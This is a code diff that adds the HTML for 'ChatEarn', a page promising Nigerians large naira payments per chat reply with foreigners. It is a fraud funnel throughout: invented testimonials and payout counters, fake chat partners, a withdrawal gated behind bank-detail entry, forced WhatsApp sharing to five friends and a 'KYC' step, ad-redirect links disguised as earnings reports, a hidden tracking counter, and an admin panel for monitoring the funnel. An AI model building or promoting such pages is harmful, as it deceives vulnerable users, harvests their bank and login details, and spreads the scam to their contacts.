@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>ChatEarn — Chat With Foreigners & Earn in Naira</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<meta name="robots" content="noindex,nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="./assets/css/chatearn.css?v=4.0.0">
+<script src="./assets/js/push-legacy.js?v=4.0.0" defer></script>
+<script src="./assets/js/clarity.js?v=4.0.0" defer></script>
+
+
+<link rel="stylesheet" href="./assets/css/chatearn-v3.css?v=4.0.0">
+
+</head>
+<body>
+
+<div id="backWarn">
+  <div class="bw-card">
+    <span class="bw-icon">💰</span>
+    <div class="bw-title">Your Earnings Will Be Lost!</div>
+    <div class="bw-body">You have <strong id="bwAmount">₦0</strong> pending. Going back will cancel your withdrawal request. Stay and complete the process.</div>
+    <button class="btn-bw-stay" onclick="closeBackWarn()">✅ Continue & Get Paid</button>
+    <button class="btn-bw-leave" onclick="closeBackWarn()">I don't want my money</button>
+  </div>
+</div>
+
+<div id="streakModal" style="position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99997;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px);">
+  <div style="background:var(--card);border:1px solid var(--line);border-radius:20px;padding:26px 22px;width:100%;max-width:340px;text-align:center;animation:pop .4s cubic-bezier(.34,1.56,.64,1);">
+    <div style="font-size:46px;margin-bottom:10px;">🔥</div>
+    <div style="font-size:20px;font-weight:800;margin-bottom:4px;" id="streakTitle">Day 1 Streak!</div>
+    <div style="font-size:13px;color:var(--text);margin-bottom:18px;" id="streakSub">Come back tomorrow to keep it going</div>
+    <div style="display:flex;justify-content:center;gap:6px;margin-bottom:18px;flex-wrap:wrap;" id="streakDays"></div>
+    <div style="background:var(--card2);border-radius:14px;padding:14px;margin-bottom:18px;">
+      <div style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;">Today's Bonus</div>
+      <div style="font-size:28px;font-weight:900;color:var(--green);margin-top:4px;" id="streakReward">₦200</div>
+    </div>
+    <button onclick="claimStreak()" style="width:100%;padding:15px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;">Claim Bonus</button>
+  </div>
+</div>
+
+
+
+<div class="login-modal" id="loginModal">
+  <div class="login-sheet">
+    <button class="login-close" onclick="closeLogin()">×</button>
+    <div class="login-title">Welcome Back</div>
+    <div class="login-sub">Log in and continue your chats and earnings.</div>
+    <div class="login-error" id="loginError"></div>
+    <div class="form-group"><label class="form-label">Email Address</label><input class="form-input" id="loginEmail" type="email" autocomplete="email" placeholder="Enter your email"></div>
+    <div class="form-group"><label class="form-label">Password</label><input class="form-input" id="loginPass" type="password" autocomplete="current-password" placeholder="Enter your password"></div>
+    <button class="btn-register" id="loginBtn" onclick="doLogin()">Log In & Continue →</button>
+  </div>
+</div>
+
+<div class="earn-toast" id="earnToast">+₦8,000 Earned! 💰</div>
+<div class="toast" id="toast"></div>
+<div class="activity-toast" id="activityToast">
+  <div class="at-av" id="atAv" style="background:#00C853;">AO</div>
+  <div class="at-body">
+    <div class="at-name" id="atName">Adaeze</div>
+    <div class="at-action" id="atAction">just earned ₦15,000 💰</div>
+  </div>
+  <div class="at-time" id="atTime">just now</div>
+</div>
+
+<div class="page-wrap">
+
+<!-- ══ LANDING ══ -->
+<div id="landing" class="screen active">
+  <div class="land-header">
+    <div class="land-logo" id="adminLogo">
+      <div class="land-logo-icon">💬</div>
+      <div class="land-logo-name">Chat<span>Earn</span></div>
+    </div>
+    <div class="land-badge">🟢 LIVE</div>
+  </div>
+
+  <div class="land-hero">
+    <div class="land-avatars">
+      <div class="land-av">🇺🇸</div>
+      <div class="land-av">🇬🇧</div>
+      <div class="land-av">🇨🇦</div>
+      <div class="land-av">🇩🇪</div>
+      <div class="land-av">🇦🇺</div>
+      <div class="land-av-count">+2K</div>
+    </div>
+
+    <div class="land-title">Chat With <em>Foreigners</em><br>& Earn in Naira</div>
+    <p class="land-sub">Nigerians are earning <strong>₦30,000–₦50,000 daily</strong> just by chatting with foreigners in their language. Join now — it's free.</p>
+
+    <div class="earn-rates">
+      <div class="er-title">EARNINGS PER REPLY</div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇺🇸</span><span class="er-lang">American English</span></div>
+        <div class="er-rate">₦15,000/reply</div>
+      </div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇬🇧</span><span class="er-lang">British English</span></div>
+        <div class="er-rate">₦12,000/reply</div>
+      </div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇨🇦</span><span class="er-lang">Canadian English</span></div>
+        <div class="er-rate">₦10,000/reply</div>
+      </div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇳🇬</span><span class="er-lang">Pidgin English</span></div>
+        <div class="er-rate">₦8,000/reply</div>
+      </div>
+    </div>
+
+    <!-- LIVE PAYOUT COUNTER -->
+    <div class="live-counter">
+      <div class="lc-left">
+        <div class="lc-dot"></div>
+        <div class="lc-label">Total paid to Nigerians today</div>
+      </div>
+      <div class="lc-amount" id="liveCounter">₦0</div>
+    </div>
+
+    <button class="btn-start" onclick="goScreen('register')">🚀 Start Earning Now — Free</button>
+
+    <div class="land-trust">
+      <div class="lt-item">✅ Free to join</div>
+      <div class="lt-item">💰 Instant earnings</div>
+      <div class="lt-item">🔒 Secure</div>
+    </div>
+
+    <!-- TESTIMONIALS -->
+    <div class="testimonials" style="margin-top:28px;">
+      <div class="testi-title">WHAT NIGERIANS ARE SAYING</div>
+      <div class="testi-card">
+        <div class="tc-top">
+          <div class="tc-av" style="background:#FF6B35;">AO</div>
+          <div><div class="tc-name">Adaeze Obi</div><div class="tc-loc">📍 Lagos</div></div>
+        </div>
+        <div class="tc-stars">★★★★★</div>
+        <div class="tc-text">"I didn't believe it at first. But after chatting for 30 minutes I saw ₦45,000 in my balance. Withdrew to OPay same day."</div>
+        <div class="tc-earned">Earned: ₦45,000 💰</div>
+      </div>
+      <div class="testi-card">
+        <div class="tc-top">
+          <div class="tc-av" style="background:#2979FF;">EM</div>
+          <div><div class="tc-name">Emeka Madu</div><div class="tc-loc">📍 Abuja</div></div>
+        </div>
+        <div class="tc-stars">★★★★★</div>
+        <div class="tc-text">"Best discovery of 2024. I chat with the American users every morning before work and make more than my salary. Join now before they close slots."</div>
+        <div class="tc-earned">Earned: ₦62,000 💰</div>
+      </div>
+      <div class="testi-card">
+        <div class="tc-top">
+          <div class="tc-av" style="background:#AA00FF;">FB</div>
+          <div><div class="tc-name">Fatima Bello</div><div class="tc-loc">📍 Kano</div></div>
+        </div>
+        <div class="tc-stars">★★★★★</div>
+        <div class="tc-text">"As a student this has been life changing. I earn ₦40,000+ every week chatting with foreigners on my phone. No laptop needed."</div>
+        <div class="tc-earned">Earned: ₦38,500 💰</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ REGISTER ══ -->
+<div id="register" class="screen">
+  <div class="reg-header">
+    <div class="reg-back" onclick="goScreen('landing')">←</div>
+    <div class="reg-title">Create Free Account</div>
+  </div>
+  <div class="reg-body">
+    <div class="reg-hero">
+      <span class="reg-hero-icon">🎉</span>
+      <h2>Get ₦10,000 Sign-Up Bonus</h2>
+      <p>Register now and receive ₦10,000 instantly credited to your account</p>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Full Name</label>
+      <input class="form-input" id="regName" type="text" placeholder="Enter your full name">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Email Address</label>
+      <input class="form-input" id="regEmail" type="email" placeholder="Enter your email">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Password</label>
+      <input class="form-input" id="regPass" type="password" placeholder="Create a password">
+    </div>
+
+    <div class="terms-row">
+      <div class="terms-cb">✓</div>
+      <div class="terms-txt">I agree to the <span>Terms of Service</span> and <span>Privacy Policy</span>. I understand earnings are paid via Opay/Palmpay.</div>
+    </div>
+
+    <button class="btn-register" id="regSubmitBtn" onclick="doRegister()">Create Account & Get ₦10,000 →</button>
+    <div class="reg-login">Already have an account? <span onclick="openLogin()" style="cursor:pointer;">Log In</span></div>
+  </div>
+</div>
+
+<!-- ══ LOADING ══ -->
+<div id="loading" class="screen">
+  <div class="ld-icon">🎉</div>
+  <div class="ld-title" id="ldTitle">Setting Up Your Account</div>
+  <p class="ld-sub" id="ldSub">Please wait while we match you with foreigners...</p>
+  <div class="ld-bar"><div class="ld-fill" id="ldFill"></div></div>
+  <div class="ld-steps" id="ldSteps">
+    <div class="ld-step" id="ls1"><div class="ld-step-dot"></div>Creating your profile...</div>
+    <div class="ld-step" id="ls2"><div class="ld-step-dot"></div>Adding ₦10,000 sign-up bonus...</div>
+    <div class="ld-step" id="ls3"><div class="ld-step-dot"></div>Matching you with foreigners...</div>
+    <div class="ld-step" id="ls4"><div class="ld-step-dot"></div>Setting up your wallet...</div>
+  </div>
+</div>
+
+<!-- ══ DASHBOARD ══ -->
+<div id="dashboard" class="screen">
+  <div class="dash-header">
+    <div class="dh-left">
+      <div class="dh-av">😊</div>
+      <div>
+        <div class="dh-name" id="dashName">Welcome!</div>
+        <div class="dh-status">🟢 Online — Ready to earn</div>
+      </div>
+    </div>
+    <div class="dh-right">
+      <div class="dh-earn">
+        <div class="dh-earn-lbl">BALANCE</div>
+        <div class="dh-earn-val" id="dashBalance">₦10,000</div>
+      </div>
+      <button type="button" class="user-logout-btn" onclick="userLogout()">Log out</button>
+    </div>
+  </div>
+
+  <div class="bonus-banner">
+    <div class="bb-icon">🎁</div>
+    <div class="bb-body">
+      <div class="bb-title">Sign-Up Bonus Received!</div>
+      <div class="bb-sub">Start chatting to earn more</div>
+    </div>
+    <div class="bb-amount">₦10,000</div>
+  </div>
+
+  <div style="padding:0 16px 12px;">
+    <div class="section-title">
+      <span class="st-label">Chat With Foreigners</span>
+      <span class="st-badge">2,847 Online</span>
+    </div>
+  </div>
+
+  <div class="foreigner-list" id="foreignerList">
+    <div class="foreigner-card" onclick="openChat(0)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#1565C0,#42A5F5);">AL<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">alexlab102</div>
+        <div class="fc-country">🇺🇸 United States · American English</div>
+      </div>
+      <button class="fc-earn">₦15K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(1)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#880E4F,#F06292);">EC<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">EmiliaCute</div>
+        <div class="fc-country">🇬🇧 United Kingdom · British English</div>
+      </div>
+      <button class="fc-earn">₦12K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(2)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#1B5E20,#66BB6A);">MJ<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">MattJohn</div>
+        <div class="fc-country">🇨🇦 Canada · Canadian English</div>
+      </div>
+      <button class="fc-earn">₦10K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(3)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#E65100,#FFA726);">AB<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">Abi1990</div>
+        <div class="fc-country">🇺🇸 United States · American English</div>
+      </div>
+      <button class="fc-earn">₦15K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(4)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#4A148C,#CE93D8);">PR<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">princess77</div>
+        <div class="fc-country">🇩🇪 Germany · European English</div>
+      </div>
+      <button class="fc-earn">₦8K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(5)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#006064,#4DD0E1);">CA<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">CamilaAnders</div>
+        <div class="fc-country">🇦🇺 Australia · Australian English</div>
+      </div>
+      <button class="fc-earn">₦10K/reply</button>
+    </div>
+  </div>
+
+  <div class="withdraw-teaser" style="margin-top:16px;">
+    <div class="wt-left">
+      <div class="wt-icon">💳</div>
+      <div class="wt-body">
+        <div class="wt-title">Withdrawal</div>
+        <div class="wt-sub" id="wdTeaserSub">Minimum: ₦40,000 — Chat to unlock</div>
+      </div>
+    </div>
+    <button class="wt-btn" id="wdTeaserBtn" onclick="tryWithdraw()">Locked 🔒</button>
+  </div>
+
+  <div style="height:20px;"></div>
+
+  <!-- TRAFFIC LINKS — Dashboard bottom -->
+  <div style="padding:0 16px 6px;">
+    <a href="https://omg10.com/4/10659981" target="_blank" onclick="return trackClick('dash_ad1')" style="display:flex;align-items:center;justify-content:space-between;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px;text-decoration:none;margin-bottom:10px;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span style="font-size:24px;">🎁</span>
+        <div>
+          <div style="font-size:14px;font-weight:700;color:var(--w);">Claim Today's Bonus Offer</div>
+          <div style="font-size:11px;color:var(--text);">Exclusive reward for active users</div>
+        </div>
+      </div>
+      <span style="font-size:13px;font-weight:800;color:var(--green);">Claim →</span>
+    </a>
+    <a href="https://omg10.com/4/10659981" target="_blank" onclick="return trackClick('dash_ad2')" style="display:flex;align-items:center;justify-content:space-between;background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:14px;padding:14px 16px;text-decoration:none;margin-bottom:10px;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span style="font-size:24px;">💳</span>
+        <div>
+          <div style="font-size:14px;font-weight:700;color:var(--w);">Boost Your Earnings Today</div>
+          <div style="font-size:11px;color:var(--text);">Complete one task to earn extra ₦5,000</div>
+        </div>
+      </div>
+      <span style="font-size:13px;font-weight:800;color:var(--green);">Open →</span>
+    </a>
+    <a href="https://omg10.com/4/10659981" target="_blank" onclick="return trackClick('dash_ad3')" style="display:flex;align-items:center;justify-content:space-between;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px;text-decoration:none;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span style="font-size:24px;">📊</span>
+        <div>
+          <div style="font-size:14px;font-weight:700;color:var(--w);">View Earnings Report</div>
+          <div style="font-size:11px;color:var(--text);">See your full earnings breakdown</div>
+        </div>
+      </div>
+      <span style="font-size:13px;font-weight:800;color:var(--green);">View →</span>
+    </a>
+  </div>
+  <div style="height:20px;"></div>
+</div>
+
+<!-- ══ CHAT ══ -->
+<div id="chat" class="screen">
+  <div class="chat-header">
+    <div class="ch-back" onclick="goScreen('dashboard')">←</div>
+    <div class="ch-av" id="chatAv">🇺🇸<div class="ch-online"></div></div>
+    <div class="ch-info">
+      <div class="ch-name" id="chatName">alexlab102</div>
+      <div class="ch-status" id="chatStatus">🟢 Online now</div>
+    </div>
+    <div class="ch-earn-badge" id="chatEarnBadge">+₦15K/reply</div>
+  </div>
+
+  <div class="chat-body" id="chatBody" style="padding-bottom:80px;">
+  </div>
+
+  <div class="offline-strip" id="offlineStrip">You are offline. Messages will retry when connection returns.</div><div class="quick-replies" id="quickReplies"></div>
+  <div class="chat-input-wrap">
+    <input class="chat-input" id="chatInput" placeholder="Type a message..." onkeypress="handleEnter(event)">
+    <button class="btn-send" onclick="sendMsg()">➤</button>
+  </div>
+</div>
+
+<!-- ══ EARNINGS PAGE ══ -->
+<div id="earnings" class="screen">
+  <div class="earn-header">
+    <h2>💰 My Earnings</h2>
+  </div>
+
+  <div class="earn-balance-card">
+    <div class="ebc-lbl">Total Balance</div>
+    <div>
+      <span class="ebc-currency">₦</span>
+      <span class="ebc-amount" id="earnPageAmount">40,000</span>
+    </div>
+    <div class="ebc-sub">Available for withdrawal</div>
+  </div>
+
+  <div class="earn-breakdown">
+    <div class="eb-hd">EARNINGS BREAKDOWN</div>
+    <div class="eb-row"><span class="eb-key">Sign-up Bonus</span><span class="eb-val">₦10,000</span></div>
+    <div class="eb-row"><span class="eb-key">Chat Earnings</span><span class="eb-val" id="chatEarnBreakdown">₦30,000</span></div>
+    <div class="eb-row"><span class="eb-key">Total Earned</span><span class="eb-val" id="totalEarnBreakdown">₦40,000</span></div>
+  </div>
+
+  <div style="padding:0 16px 20px;">
+    <button class="btn-withdraw" onclick="goScreen('withdraw')">💳 Withdraw My Earnings →</button>
+    <a href="https://jikgykm.com/cl/a9f1535a330a2652" target="_blank" style="display:block;width:100%;padding:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;font-size:14px;font-weight:700;color:var(--text);text-align:center;text-decoration:none;margin-top:10px;">📊 View Full Earnings Report →</a>
+    <a href="https://jikgykm.com/cl/a9f1535a330a2652" target="_blank" onclick="return trackClick('earn_ad1')" style="display:block;width:100%;padding:14px;background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:14px;font-size:14px;font-weight:700;color:var(--green);text-align:center;text-decoration:none;margin-top:10px;">🎁 Unlock Extra Bonus — Tap Here →</a>
+    <a href="https://jikgykm.com/cl/a9f1535a330a2652" target="_blank" onclick="return trackClick('earn_ad2')" style="display:block;width:100%;padding:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;font-size:14px;font-weight:700;color:var(--text);text-align:center;text-decoration:none;margin-top:10px;">💰 Verify Account for Faster Payout →</a>
+  </div>
+</div>
+
+<!-- ══ WITHDRAW ══ -->
+<div id="withdraw" class="screen">
+  <div class="wd-header">
+    <div class="reg-back" onclick="goScreen('earnings')">←</div>
+    <div class="reg-title">Withdraw Earnings</div>
+  </div>
+  <div class="wd-body">
+    <div class="wd-amount-display">
+      <div class="wad-lbl">Amount to Withdraw</div>
+      <div class="wad-amount" id="wdAmount">₦40,000</div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Select Bank</label>
+      <div class="bank-options">
+        <div class="bank-option selected" id="bankOpay" onclick="selectBank('opay')">
+          <div class="bo-name" style="font-size:18px;font-weight:900;letter-spacing:1px;">OPay</div>
+          <div style="font-size:11px;color:var(--text);margin-top:3px;">Mobile Bank</div>
+        </div>
+        <div class="bank-option" id="bankPalmpay" onclick="selectBank('palmpay')">
+          <div class="bo-name" style="font-size:18px;font-weight:900;letter-spacing:1px;">PalmPay</div>
+          <div style="font-size:11px;color:var(--text);margin-top:3px;">Mobile Bank</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Account Number</label>
+      <input class="form-input" id="wdAccNo" type="number" placeholder="Enter 10-digit account number" oninput="triggerBankVerify(this.value)">
+    </div>
+    <div id="bankVerifyStatus" style="display:none;margin-top:-8px;margin-bottom:12px;padding:10px 14px;border-radius:10px;font-size:13px;font-weight:700;"></div>
+    <div class="form-group">
+      <label class="form-label">Account Name</label>
+      <input class="form-input" id="wdAccName" type="text" placeholder="Enter your account name">
+    </div>
+
+    <div style="background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:#69F0AE;line-height:1.6;">
+      🔒 <strong>Secure withdrawal.</strong> Your bank details are encrypted. Payment processed within 24 hours after verification.
+    </div>
+
+    <button class="btn-place-wd" onclick="placeWithdrawal()">Place Withdrawal Request →</button>
+  </div>
+</div>
+
+<!-- ══ SHARE WALL ══ -->
+<div id="sharewall" class="screen">
+  <div style="background:var(--card);padding:16px 20px;border-bottom:1px solid var(--line);">
+    <h2 style="font-size:18px;font-weight:800;">Almost Done!</h2>
+  </div>
+  <div class="sw-body">
+    <div class="sw-hero">
+      <span class="sw-hero-icon">🔐</span>
+      <h2 id="swHeroTitle">Verify Your Account</h2>
+      <p id="swHeroSub">To process your withdrawal, share ChatEarn with <strong>5 Nigerian friends</strong> to verify your account. This prevents fraud and protects your earnings.</p>
+    </div>
+
+    <div class="sw-progress">
+      <div class="swp-top">
+        <span class="swp-lbl">Verification Progress</span>
+        <span class="swp-pct" id="swPct">0%</span>
+      </div>
+      <div class="swp-track"><div class="swp-fill" id="swFill"></div></div>
+      <div class="swp-status" id="swStatus">Share with 5 friends to unlock your withdrawal</div>
+    </div>
+
+    <div style="background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.2);border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:var(--gold);line-height:1.6;">
+      ⚡ <strong>Your ₦40,000 is waiting.</strong> Complete verification to receive payment within 24 hours.
+    </div>
+
+    <button class="btn-share-wa" id="btnShareWA" onclick="doShareWA()">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+      <span id="swBtnText">Share on WhatsApp to Verify</span>
+    </button>
+
+    <p class="sw-note">// Each share verifies your account with one Nigerian //</p>
+  </div>
+</div>
+
+<!-- ══ KYC ══ -->
+<div id="kyc" class="screen">
+  <div style="background:var(--card);padding:16px 20px;border-bottom:1px solid var(--line);">
+    <h2 style="font-size:18px;font-weight:800;">KYC Verification</h2>
+  </div>
+  <div class="kyc-body">
+    <div class="kyc-hero">
+      <span class="kyc-hero-icon">🛡️</span>
+      <h2>Complete KYC to Receive Payment</h2>
+      <p>Last step — complete your Know Your Customer verification to process your ₦40,000 payment. This is required by our payment partner.</p>
+    </div>
+
+    <div class="kyc-steps">
+      <div class="kyc-step">
+        <div class="ks-num">✓</div>
+        <div class="ks-body">
+          <div class="ks-title">Account Registration</div>
+          <div class="ks-sub">Profile created and verified</div>
+        </div>
+        <div class="ks-status">Done ✓</div>
+      </div>
+      <div class="kyc-step">
+        <div class="ks-num">✓</div>
+        <div class="ks-body">
+          <div class="ks-title">Chat Verification</div>
+          <div class="ks-sub">Earnings confirmed</div>
+        </div>
+        <div class="ks-status">Done ✓</div>
+      </div>
+      <div class="kyc-step">
+        <div class="ks-num">✓</div>
+        <div class="ks-body">
+          <div class="ks-title">Account Sharing</div>
+          <div class="ks-sub">Identity shared and confirmed</div>
+        </div>
+        <div class="ks-status">Done ✓</div>
+      </div>
+      <div class="kyc-step">
+        <div class="ks-num" style="background:var(--gold);color:#000;">4</div>
+        <div class="ks-body">
+          <div class="ks-title">Final KYC Verification</div>
+          <div class="ks-sub">Complete with our payment partner</div>
+        </div>
+        <div class="ks-status" style="color:var(--gold);">Pending →</div>
+      </div>
+    </div>
+
+    <div style="background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.2);border-radius:10px;padding:12px 14px;margin-bottom:20px;font-size:12px;color:var(--gold);line-height:1.6;">
+      ⚡ <strong>Your ₦40,000 is ready.</strong> Tap below to complete your final KYC step with our payment partner. Takes less than 30 seconds.
+    </div>
+
+    <button class="btn-complete-kyc" onclick="doKYC()">🔓 Complete KYC & Receive ₦40,000 →</button>
+  </div>
+</div>
+
+<!-- ══ PROCESSING ══ -->
+<div id="processing" class="screen" style="display:none;">
+  <div class="pp-spinner"></div>
+  <div class="pp-title">Payment Processing 💰</div>
+  <p class="pp-sub">Your <strong id="ppAmount">₦40,000</strong> withdrawal has been submitted. Payment will arrive in your <strong id="ppBank">OPay</strong> account within 24 hours.</p>
+  <div class="pp-ref">REF: <span id="ppRef">——</span></div>
+  <p style="font-size:12px;color:var(--muted);margin-bottom:20px;" id="ppBankNote">Your account will receive payment within 24 hours.</p>
+
+  <div class="pp-timeline">
+    <div class="pt-item">
+      <div class="pt-dot"></div>
+      <div class="pt-body">
+        <div class="pt-title">Withdrawal Request Submitted ✓</div>
+        <div class="pt-sub">Just now</div>
+      </div>
+    </div>
+    <div class="pt-item">
+      <div class="pt-dot" style="background:var(--gold);"></div>
+      <div class="pt-body">
+        <div class="pt-title">KYC Verification — In Progress</div>
+        <div class="pt-sub">Usually takes 1–2 hours</div>
+      </div>
+    </div>
+    <div class="pt-item">
+      <div class="pt-dot" style="background:var(--muted);"></div>
+      <div class="pt-body">
+        <div class="pt-title">Payment Sent to Your Account</div>
+        <div class="pt-sub">Within 24 hours</div>
+      </div>
+    </div>
+  </div>
+
+  <p class="pp-note">Share ChatEarn with more friends to earn more while you wait!</p>
+
+  <div style="margin-top:20px;width:100%;padding:0 20px;">
+    <button style="width:100%;padding:16px;background:var(--wa);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;" onclick="shareAgain()">📲 Share & Earn More While Waiting</button>
+  </div>
+</div>
+
+</div><!-- page-wrap -->
+
+<script src="./assets/js/chatearn-app.js?v=4.0.0" defer></script>
+  <!-- Hidden visit counter (1x1px, non-interactive, invisible to users) -->
+<div style="position:absolute;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;left:-9999px;">
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+<script type="text/javascript">sc_online_i(1735208,"ffffff","ffffff");</script>
+</div>
+
+
+<div class="admin-shell" id="adminShell">
+  <div class="admin-wrap">
+    <div class="admin-head">
+      <div><div class="admin-brand">Chat<span>Earn</span> Admin <small style="font-size:9px;color:#607067;vertical-align:middle;">v4.0</small></div><div class="admin-status-line"><span class="admin-live-dot connecting" id="adminRealtimeDot"></span><span id="adminRealtimeText">Checking connection…</span></div><div class="admin-last-updated" id="adminLastUpdated">Not refreshed yet</div><div class="admin-last-updated" id="adminAutoRefreshText">Auto-refresh every 10s</div></div>
+      <div class="admin-head-actions"><button type="button" class="admin-btn" id="adminRefreshBtn" onclick="refreshAdmin()">Refresh</button><button type="button" class="admin-btn" onclick="adminLogout()">Log out</button><button type="button" class="admin-btn" onclick="closeAdmin()">Close</button></div>
+    </div>
+    <div class="admin-error" id="adminError"></div>
+    <div class="admin-login" id="adminLoginBox">
+      <div style="font-size:21px;font-weight:900;margin-bottom:5px;">Administrator Login</div>
+      <div style="font-size:12px;color:#89968d;margin-bottom:16px;">Use your Supabase administrator account. There is no password-reset screen.</div>
+      <div class="form-group"><label class="form-label">Email</label><input class="form-input" id="adminEmail" type="email"></div>
+      <div class="form-group"><label class="form-label">Password</label><input class="form-input" id="adminPass" type="password"></div>
+      <button type="button" class="admin-btn primary" id="adminLoginBtn" style="width:100%;padding:13px;" onclick="adminLogin()">Open Admin Panel</button>
+    </div>
+    <div id="adminContent" style="display:none;">
+      <div class="admin-tabs" id="adminTabs">
+        <button type="button" class="admin-tab active" data-tab="overview" onclick="return adminSwitchTab(event,'overview',this)">Overview</button><button type="button" class="admin-tab" data-tab="live" onclick="return adminSwitchTab(event,'live',this)">Live</button><button type="button" class="admin-tab" data-tab="funnel" onclick="return adminSwitchTab(event,'funnel',this)">Funnel</button><button type="button" class="admin-tab" data-tab="pages" onclick="return adminSwitchTab(event,'pages',this)">Pages</button><button type="button" class="admin-tab" data-tab="chats" onclick="return adminSwitchTab(event,'chats',this)">Chats</button><button type="button" class="admin-tab" data-tab="shares" onclick="return adminSwitchTab(event,'shares',this)">Shares</button><button type="button" class="admin-tab" data-tab="propush" onclick="return adminSwitchTab(event,'propush',this)">ProPush</button><button type="button" class="admin-tab" data-tab="activity" onclick="return adminSwitchTab(event,'activity',this)">Activity & Errors</button><button type="button" class="admin-tab" data-tab="withdrawals" onclick="return adminSwitchTab(event,'withdrawals',this)">Withdrawals</button><button type="button" class="admin-tab" data-tab="kyc" onclick="return adminSwitchTab(event,'kyc',this)">KYC</button><button type="button" class="admin-tab" data-tab="users" onclick="return adminSwitchTab(event,'users',this)">Users</button><button type="button" class="admin-tab" data-tab="insights" onclick="return adminSwitchTab(event,'insights',this)">AI Insights</button>
+      </div>
+      <div class="admin-panel active" id="admin-overview"><div class="admin-status-banner"><b>Traffic counting:</b> unique browsers do not increase when the same person refreshes. Sessions, site entries and page views are shown separately.</div><div class="admin-grid" id="overviewKpis"></div><div class="admin-two"><div><div class="admin-section-title">Latest meaningful activity</div><div class="admin-list" id="overviewActivity"></div></div><div><div class="admin-section-title">Immediate attention</div><div class="admin-list" id="overviewAttention"></div></div></div></div>
+      <div class="admin-panel" id="admin-live"><div class="admin-grid" id="liveKpis"></div><div class="admin-section-title">Visitors online now</div><div class="admin-list" id="liveList"></div></div>
